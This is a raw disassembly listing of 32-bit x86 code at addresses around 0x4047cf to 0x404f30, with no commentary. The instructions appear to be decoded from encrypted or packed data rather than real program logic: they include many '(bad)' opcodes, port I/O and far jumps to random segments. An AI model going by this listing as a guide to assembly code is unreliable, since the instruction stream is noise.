  4047cf:	sub    dl,0xa6
  4047d2:	jl     0x4047cb
  4047d4:	gs (bad) 
  4047d6:	and    ah,BYTE PTR [esi-0x1e32c548]
  4047dc:	sbb    eax,0xcfffdea3
  4047e1:	clc    
  4047e2:	sbb    edx,ebx
  4047e4:	(bad)  
  4047e6:	jns    0x4047c7
  4047e8:	jge    0x4047e9
  4047ea:	add    BYTE PTR [edx+0x14],bh
  4047ed:	int3   
  4047ee:	repnz mov ecx,0x81d7e19c
  4047f4:	sbb    al,0xaf
  4047f6:	das    
  4047f7:	in     al,dx
  4047f8:	ins    BYTE PTR es:[edi],dx
  4047f9:	jg     0x40483b
  4047fb:	int    0x6f
  4047fd:	cld    
  4047fe:	nop
  4047ff:	sub    BYTE PTR [edx-0x58972732],0xe4
  404806:	jns    0x4047d1
  404808:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404809:	lods   al,BYTE PTR ds:[esi]
  40480a:	inc    ebx
  40480b:	(bad)  
  40480c:	loop   0x4047b1
  40480e:	aam    0xff
  404810:	inc    edx
  404811:	stos   BYTE PTR es:[edi],al
  404812:	sbb    eax,esi
  404814:	stc    
  404815:	mov    ah,0xaa
  404817:	jbe    0x4047f5
  404819:	loop   0x404870
  40481b:	or     BYTE PTR [edi-0x72],bl
  40481e:	icebp  
  40481f:	in     eax,dx
  404820:	sar    bh,0xa6
  404823:	ss dec ebp
  404825:	pop    ebp
  404826:	ss adc eax,0x82d069da
  40482c:	mov    WORD PTR [edx+0x29],es
  40482f:	mov    WORD PTR [edi],gs
  404831:	adc    ecx,DWORD PTR [ebx+0x1a]
  404834:	dec    edx
  404835:	test   BYTE PTR [edi+0x74],cl
  404838:	or     DWORD PTR [edx+ebx*8-0x30d41f7c],esp
  40483f:	lock add BYTE PTR ds:0x3bba0427,dl
  404846:	add    BYTE PTR [ecx],al
  404848:	mov    cl,BYTE PTR [edi+0x53ac877f]
  40484e:	nop
  40484f:	mov    ecx,0x5be3e5f5
  404854:	dec    edi
  404855:	and    eax,0xd773f584
  40485a:	adc    DWORD PTR [ebx],ebx
  40485c:	xchg   ebp,eax
  40485d:	scas   eax,DWORD PTR es:[edi]
  40485e:	inc    esi
  40485f:	call   0xbe124fa2
  404864:	mov    esp,0xd167cc9f
  404869:	jb     0x404853
  40486b:	jns    0x404855
  40486d:	fisttp DWORD PTR [ecx+0x5a]
  404870:	cmp    BYTE PTR [edi+0x74],0x34
  404874:	push   edi
  404875:	retf   0xe6dc
  404878:	inc    ebx
  404879:	div    BYTE PTR [esi+0x47]
  40487c:	adc    DWORD PTR [ecx],ebx
  40487e:	push   cs
  40487f:	std    
  404880:	leave  
  404881:	and    esi,DWORD PTR [edi+ecx*8]
  404884:	data16 test bl,0x69
  404888:	(bad)  
  404889:	emms   
  40488b:	gs xchg ebp,eax
  40488d:	in     al,0x81
  40488f:	mov    ah,0xeb
  404891:	mov    eax,DWORD PTR [esi-0x1842b450]
  404897:	scas   eax,DWORD PTR es:[edi]
  404898:	das    
  404899:	xor    al,0x7a
  40489b:	lea    eax,[edx+esi*4]
  40489e:	das    
  40489f:	inc    edi
  4048a0:	lea    edx,[esi]
  4048a2:	sbb    ch,BYTE PTR [eax+eax*8+0x19]
  4048a6:	jns    0x40484d
  4048a8:	iret   
  4048a9:	dec    ecx
  4048aa:	cmc    
  4048ab:	arpl   WORD PTR [ebp+0x3a07e5f9],bx
  4048b1:	retf   0x5d65
  4048b4:	cmp    BYTE PTR [ecx-0x67],ah
  4048b7:	into   
  4048b8:	push   0xfffffff2
  4048ba:	inc    ecx
  4048bb:	adc    al,0x39
  4048bd:	fcomp  DWORD PTR [ebp+edx*4-0x41131ee9]
  4048c4:	and    al,0xb9
  4048c6:	jmp    0xa8fc:0x8548d2f8
  4048cd:	or     edi,ecx
  4048cf:	repz sti 
  4048d1:	fnstsw WORD PTR [eax-0x5fd55132]
  4048d7:	pop    edx
  4048d8:	mov    esp,0x377e9a21
  4048dd:	pop    esp
  4048de:	mov    esp,0x7bfd6e4b
  4048e3:	cmp    eax,0x26fe147a
  4048e8:	mov    dl,0x22
  4048ea:	adc    DWORD PTR [edi],eax
  4048ec:	push   ss
  4048ed:	std    
  4048ee:	jecxz  0x4048ce
  4048f0:	aam    0x13
  4048f2:	or     al,0xa6
  4048f4:	ja     0x4048b9
  4048f6:	mov    ecx,0xd708c153
  4048fb:	add    BYTE PTR [ecx-0x72],cl
  4048fe:	gs or  dh,ch
  404901:	mov    ds:0x7995a66f,eax
  404906:	xchg   esi,eax
  404907:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404908:	fadd   st,st(4)
  40490a:	dec    edx
  40490b:	das    
  40490c:	shl    BYTE PTR [edx+0x77413ad6],0xd1
  404913:	jecxz  0x404904
  404915:	mov    DWORD PTR [edi+ebp*8-0x700c7cb7],edx
  40491c:	and    bl,cl
  40491e:	fnsave [ebx+0x11581d78]
  404924:	and    cl,ch
  404926:	push   esp
  404927:	cmp    eax,0x437e6e30
  40492c:	test   ebp,edx
  40492e:	shl    BYTE PTR [ebp-0x7c],cl
  404931:	popa   
  404932:	ins    BYTE PTR es:[edi],dx
  404933:	or     al,0x7d
  404935:	cli    
  404936:	mov    ah,0x52
  404938:	out    dx,eax
  404939:	iret   
  40493a:	jge    0x4048ea
  40493c:	idiv   DWORD PTR [edi]
  40493e:	pop    es
  40493f:	push   0x30
  404941:	outs   dx,DWORD PTR ds:[esi]
  404942:	ret    
  404943:	bound  ebx,QWORD PTR [edi]
  404945:	nop
  404946:	mov    ecx,0x71f7335b
  40494b:	mov    eax,ds:0x6ba8fefa
  404950:	(bad)  
  404951:	cmp    ebp,DWORD PTR [ebp+0x9]
  404954:	aas    
  404955:	scas   eax,DWORD PTR es:[edi]
  404956:	shr    DWORD PTR ds:[ebx-0x46eb9eb7],cl
  40495d:	push   0xfe5b3ec3
  404962:	mov    dl,0x8
  404964:	pop    ecx
  404965:	adc    esi,DWORD PTR [esi+edx*8-0x5860d03c]
  40496c:	or     DWORD PTR [ecx-0x6c0fd705],ebp
  404972:	inc    edi
  404973:	out    dx,eax
  404974:	call   0xe0f5:0xc5166ce5
  40497b:	fcmovb st,st(2)
  40497d:	jnp    0x404984
  40497f:	cs mov bl,0x9f
  404982:	cmc    
  404983:	arpl   WORD PTR [edi-0x4a],dx
  404986:	int3   
  404987:	sahf   
  404988:	fnstcw WORD PTR [eax]
  40498a:	sbb    al,0x6
  40498c:	inc    esp
  40498d:	push   ss
  40498e:	cwde   
  40498f:	jb     0x404991
  404991:	xor    BYTE PTR [esi-0x76],0xc6
  404995:	sub    DWORD PTR [ecx],ebp
  404997:	jns    0x404967
  404999:	sbb    al,0xbe
  40499b:	out    0xa1,eax
  40499d:	xor    DWORD PTR [edx+0x79],eax
  4049a0:	adc    DWORD PTR [esi],edi
  4049a2:	ds es push cs
  4049a5:	dec    esi
  4049a6:	inc    edi
  4049a7:	or     DWORD PTR [esi],esp
  4049a9:	dec    esi
  4049aa:	or     ebx,ecx
  4049ac:	jge    0x4049a3
  4049ae:	inc    ebp
  4049af:	outs   dx,BYTE PTR ds:[esi]
  4049b0:	mov    WORD PTR [eax],?
  4049b2:	inc    ebp
  4049b3:	dec    edi
  4049b4:	adc    DWORD PTR [eax],ecx
  4049b6:	mov    ecx,0x95fab5c6
  4049bb:	xor    eax,0x95226a06
  4049c0:	push   eax
  4049c1:	daa    
  4049c2:	pop    ds
  4049c3:	popf   
  4049c4:	(bad)  
  4049c5:	rcr    bl,cl
  4049c7:	push   edx
  4049c8:	fbstp  TBYTE PTR [ebx+0x19]
  4049cb:	mov    gs,WORD PTR [edi-0x17]
  4049ce:	mov    bl,0x9e
  4049d0:	out    dx,eax
  4049d1:	nop
  4049d2:	mov    edi,0x59698084
  4049d7:	mov    ds:0x34778c4a,al
  4049dc:	imul   edi,ebp,0xcf7c6768
  4049e2:	inc    edi
  4049e3:	pop    es
  4049e4:	hlt    
  4049e5:	es inc ecx
  4049e7:	(bad)  
  4049e8:	jb     0x404a47
  4049ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049eb:	mov    esi,0xf1ab020e
  4049f0:	les    edx,FWORD PTR [ecx+0x65bba7ba]
  4049f6:	jns    0x404a6f
  4049f8:	sub    DWORD PTR [ecx],esp
  4049fa:	ja     0x404a01
  4049fc:	shl    DWORD PTR ds:0xd5d3bdbc,1
  404a02:	jns    0x404a33
  404a04:	arpl   WORD PTR [esi],si
  404a06:	das    
  404a07:	inc    edx
  404a08:	pop    edi
  404a09:	sub    DWORD PTR [edx-0x3d],eax
  404a0c:	test   DWORD PTR [ebx+esi*4],ebx
  404a0f:	leave  
  404a10:	mov    ds:0xb69d29ac,eax
  404a15:	lea    ebx,[esi-0x5c]
  404a18:	add    bh,BYTE PTR [esi]
  404a1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a1b:	xor    DWORD PTR [ecx],ecx
  404a1d:	or     eax,0x24f013e8
  404a22:	popf   
  404a23:	push   esp
  404a24:	sbb    ebp,edi
  404a26:	jmp    0x404a0a
  404a28:	mov    ah,0x23
  404a2a:	iret   
  404a2b:	(bad)  
  404a2c:	iret   
  404a2d:	sub    eax,DWORD PTR [ebx]
  404a2f:	pop    eax
  404a30:	pushf  
  404a31:	cmp    BYTE PTR [esi+ecx*4+0x5577c3f0],ch
  404a38:	sbb    DWORD PTR gs:[ecx],esp
  404a3b:	mov    ds:0x68ffb842,al
  404a40:	aad    0x8f
  404a42:	cmp    DWORD PTR [esi+0x17],ebx
  404a45:	js     0x404a6c
  404a47:	cmp    esi,DWORD PTR [edi-0x569ef85f]
  404a4d:	mov    dl,BYTE PTR [ebx+edx*1+0x66]
  404a51:	sub    BYTE PTR [esi],ch
  404a53:	xor    ch,BYTE PTR [esi]
  404a55:	jg     0x404aaf
  404a57:	sbb    DWORD PTR [esi+0x59],edi
  404a5a:	adc    bh,dh
  404a5c:	call   0xd935:0xa0494a75
  404a63:	jmp    0xe779:0x19b7db6f
  404a6a:	mov    eax,0xcc0436c
  404a6f:	push   esi
  404a70:	inc    ebp
  404a71:	add    DWORD PTR [eax+0x58],esp
  404a74:	mov    dl,0xd0
  404a76:	aas    
  404a77:	lea    esi,[edi]
  404a79:	push   esp
  404a7a:	enter  0x9894,0x11
  404a7e:	shl    edx,cl
  404a80:	inc    edx
  404a81:	mov    edi,0xdbb7c9a5
  404a86:	sbb    BYTE PTR [ebp-0x74],bl
  404a89:	cmp    BYTE PTR [eax+0x5f8aab46],ah
  404a8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a90:	lock mov WORD PTR fs:[ebp+ebp*8-0x5f],cs
  404a96:	icebp  
  404a97:	sbb    ecx,DWORD PTR [eax-0x1b]
  404a9a:	ds fs pushf 
  404a9d:	inc    edi
  404a9e:	clc    
  404a9f:	es jns 0x404a2a
  404aa2:	iret   
  404aa3:	cmp    bh,BYTE PTR [edi+edx*1+0x2c]
  404aa7:	push   ss
  404aa8:	repz or eax,0x7bb069dd
  404aae:	(bad)  
  404aaf:	ds jg  0x404ac8
  404ab2:	push   ss
  404ab3:	sahf   
  404ab4:	jmp    0x404a85
  404ab6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ab7:	retf   
  404ab8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ab9:	stc    
  404aba:	mov    ds:0xf008bc13,al
  404abf:	xchg   esp,eax
  404ac0:	bnd jl 0x404ae0
  404ac3:	or     esp,ecx
  404ac5:	cmp    ebp,DWORD PTR [edi-0x3f]
  404ac8:	cld    
  404ac9:	cs push eax
  404acb:	cmp    DWORD PTR [ebp-0x418a06d4],esp
  404ad1:	(bad)  
  404ad2:	leave  
  404ad3:	dec    eax
  404ad4:	je     0x404ace
  404ad6:	push   cs
  404ad7:	inc    esi
  404ad8:	jecxz  0x404b15
  404ada:	mov    edi,0x8b3dc636
  404adf:	and    BYTE PTR [edi+0x26],ch
  404ae2:	dec    edi
  404ae3:	inc    esi
  404ae4:	out    dx,al
  404ae5:	or     al,0x66
  404ae7:	fst    DWORD PTR [ebx+0x5fc6a892]
  404aed:	(bad)  
  404aee:	push   ss
  404aef:	mov    ?,WORD PTR ds:0x2d39b5e5
  404af5:	xchg   esp,eax
  404af6:	mov    BYTE PTR [esi-0x70110922],ch
  404afc:	push   edx
  404afd:	add    esi,DWORD PTR [edx]
  404aff:	frstor [ecx-0x18fcc599]
  404b05:	inc    ecx
  404b06:	aaa    
  404b07:	fisub  DWORD PTR [ebp+0x2aa2479a]
  404b0d:	adc    dh,BYTE PTR [eax-0x55]
  404b10:	pop    ecx
  404b11:	pop    ebp
  404b12:	stos   DWORD PTR es:[edi],eax
  404b13:	or     edx,DWORD PTR [ebx+0x77]
  404b16:	push   esp
  404b17:	push   cs
  404b18:	mov    cs,WORD PTR [ebp+edx*2-0x7c4b6c69]
  404b1f:	scas   eax,DWORD PTR es:[edi]
  404b20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b21:	ror    esp,1
  404b23:	inc    esi
  404b24:	or     al,0x88
  404b26:	not    BYTE PTR [ebx]
  404b28:	fnstenv [edi]
  404b2a:	addr16 push es
  404b2c:	mov    eax,ds:0x9f89fd0f
  404b31:	xlat   BYTE PTR ds:[ebx]
  404b32:	clc    
  404b33:	js     0x404b26
  404b35:	test   DWORD PTR [esi+0x3b],0x685178e8
  404b3c:	leave  
  404b3d:	pushf  
  404b3e:	rcr    DWORD PTR [ebx+ebx*2],0x59
  404b42:	out    dx,eax
  404b43:	mov    dl,0x94
  404b45:	mov    dl,0x2f
  404b47:	mov    al,0x31
  404b49:	mov    eax,ds:0x72bef195
  404b4e:	mov    ds:0xdf195467,al
  404b53:	jae    0x404bd4
  404b55:	and    BYTE PTR [edx-0x2441eae8],al
  404b5b:	mov    DWORD PTR [ecx+0x1e],0xd67866f1
  404b62:	sub    dh,0xfa
  404b65:	and    eax,0x3ba6dde3
  404b6a:	add    al,0x2d
  404b6c:	nop
  404b6d:	mov    ch,0x71
  404b6f:	lods   eax,DWORD PTR ds:[esi]
  404b70:	je     0x404bf1
  404b72:	sub    al,0x84
  404b74:	sub    al,0xeb
  404b76:	clc    
  404b77:	out    dx,al
  404b78:	clc    
  404b79:	pop    esp
  404b7a:	sar    dh,0xb8
  404b7d:	adc    eax,0x9ec2bdc3
  404b82:	stc    
  404b83:	mov    cl,0x8f
  404b85:	sub    al,0x51
  404b87:	push   esi
  404b88:	es ja  0x404b82
  404b8b:	mov    edx,0x94ef8f42
  404b90:	mov    esp,0xe47e0f9a
  404b95:	ds icebp 
  404b97:	push   edi
  404b98:	popf   
  404b99:	lea    ebp,ds:0xaa317401
  404b9f:	sar    BYTE PTR [esi-0x79],0xdd
  404ba3:	fsubr  QWORD PTR [ebx-0x2c]
  404ba6:	(bad)  
  404ba7:	sub    ah,cl
  404ba9:	(bad)  
  404baa:	ss jl  0x404b39
  404bad:	lods   eax,DWORD PTR ds:[esi]
  404bae:	mov    gs,WORD PTR [ecx]
  404bb0:	pop    ds
  404bb1:	add    ch,BYTE PTR [edx+0x7f]
  404bb4:	pcmpgtw mm6,mm7
  404bb7:	mov    bl,0xdf
  404bb9:	xchg   edi,eax
  404bba:	inc    ecx
  404bbb:	fwait
  404bbc:	retf   0x40d3
  404bbf:	pop    ecx
  404bc0:	sar    BYTE PTR [ebp-0x1e],1
  404bc3:	sub    eax,0x562c82bd
  404bc8:	das    
  404bc9:	popf   
  404bca:	sub    ebx,edi
  404bcc:	xchg   edx,eax
  404bcd:	loope  0x404c01
  404bcf:	fisubr DWORD PTR [esi]
  404bd1:	dec    eax
  404bd2:	push   eax
  404bd3:	mov    dh,0x3e
  404bd5:	inc    esp
  404bd6:	sti    
  404bd7:	xor    al,0x39
  404bd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bda:	cli    
  404bdb:	xor    al,0x6f
  404bdd:	jo     0x404c09
  404bdf:	xor    eax,0x8a5c58e4
  404be4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404be5:	ror    DWORD PTR [ecx+eax*1],0x93
  404be9:	jno    0x404c52
  404beb:	dec    ecx
  404bec:	jge    0x404c39
  404bee:	mov    dh,0x5
  404bf0:	sub    ch,BYTE PTR [edi+ebp*8+0x3f3bdb74]
  404bf7:	sahf   
  404bf8:	cmp    DWORD PTR [eax+0x52],esi
  404bfb:	jb     0x404bbf
  404bfd:	push   0xd0fb1d9f
  404c02:	cmp    al,0xb
  404c04:	data16 xor bh,cl
  404c07:	inc    esp
  404c08:	push   bx
  404c0a:	sbb    bh,ah
  404c0c:	test   al,0x5
  404c0e:	inc    esp
  404c0f:	imul   eax,DWORD PTR [eax+ebx*2],0xc1a4d712
  404c16:	out    0xa2,al
  404c18:	retf   0xb609
  404c1b:	push   edi
  404c1c:	mov    bl,0xb9
  404c1e:	adc    ebp,0x10
  404c21:	cdq    
  404c22:	test   bh,cl
  404c24:	or     al,0xbb
  404c26:	loopne 0x404bdc
  404c28:	inc    esp
  404c29:	dec    esp
  404c2a:	clc    
  404c2b:	sbb    ch,ah
  404c2d:	or     DWORD PTR [esi-0x5b254203],eax
  404c33:	jge    0x404c99
  404c35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c36:	pop    edi
  404c37:	inc    ecx
  404c38:	jnp    0x404bea
  404c3a:	xlat   BYTE PTR ds:[ebx]
  404c3b:	in     eax,0x31
  404c3d:	imul   edx,DWORD PTR [edi-0x5b817b24],0x35c2079
  404c47:	adc    eax,0x7bb1235a
  404c4c:	test   DWORD PTR [edi],edx
  404c4e:	ret    
  404c4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c50:	push   esp
  404c51:	loop   0x404c01
  404c53:	aaa    
  404c54:	repnz aas 
  404c56:	call   0xc910f69d
  404c5b:	cld    
  404c5c:	jo     0x404c55
  404c5e:	cmp    cl,ch
  404c60:	pop    eax
  404c61:	lahf   
  404c62:	(bad)  
  404c63:	loopne 0x404c82
  404c65:	dec    ebp
  404c66:	cdq    
  404c67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c68:	jmp    0xe0b5d753
  404c6d:	mov    al,0x54
  404c6f:	inc    eax
  404c70:	pop    ecx
  404c72:	into   
  404c73:	mov    dl,0x1c
  404c75:	cwde   
  404c76:	xchg   edx,eax
  404c77:	pop    ecx
  404c78:	aas    
  404c79:	fisttp DWORD PTR [ebx+0x1fcdae40]
  404c7f:	retf   
  404c80:	add    dl,dl
  404c82:	jae    0x404c0a
  404c84:	adc    eax,0x987f7af9
  404c89:	ss cmp ebp,edx
  404c8c:	and    DWORD PTR [ebp-0x2b],edx
  404c8f:	cmp    al,0x8c
  404c91:	into   
  404c92:	ins    DWORD PTR es:[edi],dx
  404c93:	out    0xbc,eax
  404c95:	fdiv   QWORD PTR [ebx-0x23ceaa40]
  404c9b:	daa    
  404c9c:	xor    BYTE PTR [eax+0x1d],al
  404c9f:	daa    
  404ca0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ca1:	lods   eax,DWORD PTR ds:[esi]
  404ca2:	inc    eax
  404ca3:	jmp    0x76eb:0xd1b5989c
  404caa:	sahf   
  404cab:	jg     0x404c3a
  404cad:	xchg   edi,eax
  404cae:	fldenv [ecx]
  404cb0:	mov    ds:0x465582ee,eax
  404cb5:	sahf   
  404cb6:	push   edx
  404cb7:	adc    DWORD PTR [edi-0x20130e84],0x7151c9a5
  404cc1:	ret    0x596b
  404cc4:	pop    ebx
  404cc5:	cdq    
  404cc6:	mov    ecx,0x33a77718
  404ccb:	nop
  404ccc:	imul   ebp,eax,0xfffffff8
  404ccf:	js     0x404c9b
  404cd1:	xor    al,0xed
  404cd3:	pop    ebp
  404cd4:	nop
  404cd5:	pushf  
  404cd6:	sub    al,0xb6
  404cd8:	xchg   ecx,eax
  404cd9:	mov    ecx,esp
  404cdb:	inc    edx
  404cdc:	fucomp st(7)
  404cde:	xchg   esp,eax
  404cdf:	push   ebp
  404ce0:	jae    0x404d47
  404ce2:	aaa    
  404ce3:	fdivr  DWORD PTR [edx]
  404ce5:	loop   0x404d4b
  404ce7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ce8:	jge    0x404ce3
  404cea:	shl    DWORD PTR [esp+eiz*4],1
  404ced:	test   edx,esi
  404cef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404cf0:	arpl   bp,si
  404cf2:	jbe    0x404c8f
  404cf4:	add    DWORD PTR [edi],edx
  404cf6:	out    dx,al
  404cf7:	jb     0x404d2b
  404cf9:	mov    ebp,0x3441b556
  404cfe:	xor    ah,BYTE PTR [ebx-0x5b]
  404d01:	inc    ebp
  404d02:	pop    DWORD PTR [eax-0x1d]
  404d05:	sahf   
  404d06:	add    eax,0x64fd483e
  404d0b:	ins    BYTE PTR es:[edi],dx
  404d0c:	scas   eax,DWORD PTR es:[edi]
  404d0d:	push   ecx
  404d0e:	cmp    bl,BYTE PTR [ebp+0x8]
  404d11:	push   es
  404d12:	mov    gs,WORD PTR [ebx]
  404d14:	add    ebx,DWORD PTR [ecx]
  404d16:	cmp    bl,BYTE PTR [esi+0x6c]
  404d19:	jecxz  0x404cae
  404d1b:	arpl   si,bp
  404d1d:	adc    ecx,esi
  404d1f:	sub    esp,DWORD PTR [eax+edx*1-0x3a2c6a81]
  404d26:	into   
  404d27:	pop    es
  404d28:	add    eax,0x289e24e
  404d2d:	xchg   ecx,eax
  404d2e:	retf   0x408
  404d31:	sub    al,0xee
  404d33:	pop    edx
  404d34:	xchg   ebx,eax
  404d35:	hlt    
  404d36:	mov    bl,0x51
  404d38:	out    dx,al
  404d39:	cmp    DWORD PTR [edx],edi
  404d3b:	jp     0x404d4e
  404d3d:	fadd   QWORD PTR [ebp-0x51541864]
  404d43:	mov    ?,WORD PTR [edx+0x4ec344d7]
  404d49:	pop    eax
  404d4a:	pop    ds
  404d4b:	push   ecx
  404d4c:	or     edi,DWORD PTR [edx]
  404d4e:	xchg   esp,eax
  404d4f:	cmp    eax,0x3d8fc60f
  404d54:	loopne 0x404cff
  404d56:	and    ebx,esi
  404d58:	mov    ebp,0xf8872d71
  404d5d:	lsl    esp,WORD PTR [esi-0x1b68e490]
  404d64:	mov    BYTE PTR [edi],0x5a
  404d67:	mov    edi,esi
  404d69:	out    0x28,al
  404d6b:	mov    dl,0x70
  404d6d:	cwde   
  404d6e:	pop    ecx
  404d6f:	sbb    al,0x48
  404d71:	mov    edx,fs
  404d73:	outs   dx,DWORD PTR ds:[esi]
  404d74:	sub    al,0xd2
  404d76:	mov    bl,0x4a
  404d78:	in     eax,dx
  404d79:	inc    edx
  404d7a:	retf   
  404d7b:	shl    BYTE PTR [edx],1
  404d7d:	add    DWORD PTR [ebp+0x4a],edi
  404d80:	js     0x404d5d
  404d82:	pusha  
  404d83:	fadd   QWORD PTR [eax+0x7dececd8]
  404d89:	jle    0x404d69
  404d8b:	add    dl,BYTE PTR [eax]
  404d8d:	mov    ecx,0xea5066d6
  404d92:	int    0xcf
  404d94:	inc    eax
  404d95:	pop    edx
  404d96:	mov    bl,0xfc
  404d98:	jns    0x404d1b
  404d9a:	mov    BYTE PTR [ebp-0x51],ch
  404d9d:	adc    BYTE PTR [esp+esi*1],bh
  404da0:	scas   al,BYTE PTR es:[edi]
  404da1:	jne    0x404e22
  404da3:	mov    cl,0x1e
  404da5:	dec    eax
  404da6:	stos   BYTE PTR es:[edi],al
  404da7:	fdiv   DWORD PTR [esi+0xbbdfc97]
  404dad:	adc    eax,0x30b26582
  404db2:	xchg   BYTE PTR [ebp-0x5774bb41],dh
  404db8:	aad    0x94
  404dba:	mov    esi,0x6d9a41e6
  404dbf:	adc    BYTE PTR [eax+0x3a3e288f],0x89
  404dc6:	ja     0x404e11
  404dc8:	inc    edx
  404dc9:	xchg   ebx,eax
  404dca:	cmp    DWORD PTR [eax],0x35
  404dcd:	adc    al,0xaa
  404dcf:	push   edi
  404dd0:	cdq    
  404dd1:	hlt    
  404dd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dd3:	iret   
  404dd4:	popf   
  404dd5:	ins    DWORD PTR es:[edi],dx
  404dd6:	jmp    0x404d7d
  404dd8:	clc    
  404dd9:	scas   eax,DWORD PTR es:[edi]
  404dda:	mov    edi,0x5b4478ab
  404ddf:	xchg   ebp,eax
  404de0:	xor    bh,dh
  404de2:	cli    
  404de3:	leave  
  404de4:	in     al,0xd0
  404de6:	jle    0x404d91
  404de8:	jne    0x404dd2
  404dea:	bound  ebx,QWORD PTR [ebx+0x6]
  404ded:	mov    edx,0x357ebfb7
  404df2:	fdivr  DWORD PTR [edx]
  404df4:	(bad)  
  404df5:	jno    0x404d94
  404df7:	ds inc esp
  404df9:	or     al,ch
  404dfb:	nop
  404dfc:	std    
  404dfd:	rcr    DWORD PTR [esi+0x10],cl
  404e00:	jmp    0x404e5b
  404e02:	and    eax,DWORD PTR [ecx-0x4d9f7dca]
  404e08:	call   0xb59e3582
  404e0d:	ins    BYTE PTR es:[edi],dx
  404e0e:	push   esp
  404e0f:	test   BYTE PTR [edi],ah
  404e11:	push   0x7b
  404e13:	imul   ecx,DWORD PTR [ebx+0x16],0xc90f7032
  404e1a:	fld    DWORD PTR [edi+0x390ff2c4]
  404e20:	iret   
  404e21:	ror    BYTE PTR [esi],1
  404e23:	or     al,0x2f
  404e25:	lds    ebp,FWORD PTR [eax-0x4e]
  404e28:	or     DWORD PTR [ebp-0x36],esi
  404e2b:	push   edi
  404e2c:	es retf 0x3b4e
  404e30:	inc    eax
  404e31:	cli    
  404e32:	iret   
  404e33:	inc    edx
  404e34:	lea    ebp,[esi-0x6731b87b]
  404e3a:	add    eax,0xc82d978a
  404e3f:	add    DWORD PTR [ebx],ebx
  404e41:	outs   dx,BYTE PTR ds:[esi]
  404e42:	jne    0x404e91
  404e44:	aam    0xf2
  404e46:	and    BYTE PTR [edi+ebp*4+0x1c],ah
  404e4a:	mov    bl,0x81
  404e4c:	cmp    al,0x4d
  404e4e:	fisub  WORD PTR [eax]
  404e50:	push   ebx
  404e51:	xor    eax,DWORD PTR [edx+0xe]
  404e54:	jno    0x404e3e
  404e56:	ds sub eax,0x56ea67b0
  404e5c:	mov    eax,ds:0xb570232
  404e61:	enter  0xffe9,0x8a
  404e65:	push   ebp
  404e66:	add    BYTE PTR [edx],dh
  404e68:	cmc    
  404e69:	adc    DWORD PTR [esi],esi
  404e6b:	mov    edi,0x54c34c8c
  404e70:	gs ja  0x404eb8
  404e73:	test   DWORD PTR [ecx],ebp
  404e75:	in     al,dx
  404e76:	(bad)  [esi+ecx*4]
  404e79:	pop    edx
  404e7a:	leave  
  404e7b:	adc    eax,0x7a2cae25
  404e80:	adc    ebx,DWORD PTR [ebx-0x3735c875]
  404e86:	adc    DWORD PTR [ebx+0x1c],ecx
  404e89:	cmp    al,0xb0
  404e8b:	xchg   BYTE PTR [ecx],dl
  404e8d:	std    
  404e8e:	push   0x28c40857
  404e93:	push   ebp
  404e94:	jns    0x404e28
  404e96:	mov    gs,esp
  404e98:	sub    esi,esp
  404e9a:	push   edx
  404e9b:	call   0x2ee0:0xe90ee041
  404ea2:	addr16 dec esi
  404ea4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ea5:	xchg   BYTE PTR [ebx],bl
  404ea7:	mov    ah,BYTE PTR [ebx-0x2e]
  404eaa:	fstp   st(5)
  404eac:	xchg   esp,eax
  404ead:	lds    ecx,FWORD PTR [ecx]
  404eaf:	fwait
  404eb0:	jne    0x404e4e
  404eb2:	ds mov dh,0xe
  404eb5:	jge    0x404ef4
  404eb7:	in     al,0x74
  404eb9:	retf   0x34ac
  404ebc:	mov    bh,0x2f
  404ebe:	push   0x35d5fd8d
  404ec3:	jo     0x404f10
  404ec5:	jbe    0x404e75
  404ec7:	sbb    DWORD PTR ds:0xe5cd7bf8,eax
  404ecd:	pop    ecx
  404ece:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ecf:	mov    esi,0x36a5a273
  404ed4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ed5:	xor    eax,0x2b5cd7be
  404eda:	loop   0x404e83
  404edc:	ret    0xd9b3
  404edf:	ror    DWORD PTR ds:0x1b432410,0xec
  404ee6:	mov    dh,0x5d
  404ee8:	pop    ebx
  404ee9:	mov    cl,0x90
  404eeb:	iret   
  404eec:	int3   
  404eed:	xor    al,0xa4
  404eef:	mov    ebx,0x1123c02b
  404ef4:	(bad)  
  404ef5:	ffreep st(0)
  404ef7:	loope  0x404f50
  404ef9:	fcomp  QWORD PTR [edx+0x7a838184]
  404eff:	xor    BYTE PTR [edx+0x666368fd],ch
  404f05:	pop    es
  404f06:	ins    BYTE PTR es:[edi],dx
  404f07:	jnp    0x404f46
  404f09:	adc    edi,DWORD PTR [edi]
  404f0b:	popa   
  404f0c:	xor    al,0x15
  404f0e:	mov    bh,0x3
  404f10:	pop    ds
  404f11:	test   BYTE PTR [ebx+0x5d],bl
  404f14:	dec    ebp
  404f15:	out    dx,eax
  404f16:	sbb    ebp,esp
  404f18:	lods   al,BYTE PTR es:[esi]
  404f1a:	sbb    bh,dh
  404f1c:	iret   
  404f1d:	shl    ebx,1
  404f1f:	cmc    
  404f20:	nop
  404f21:	retf   0xe688
  404f24:	mov    DWORD PTR [ecx-0x6b],edx
  404f27:	cld    
  404f28:	mov    al,bl
  404f2a:	in     al,dx
  404f2b:	mov    WORD PTR [eax],fs
  404f2d:	scas   eax,DWORD PTR es:[edi]
  404f2e:	repz dec ebx
  404f30:	pop    ss
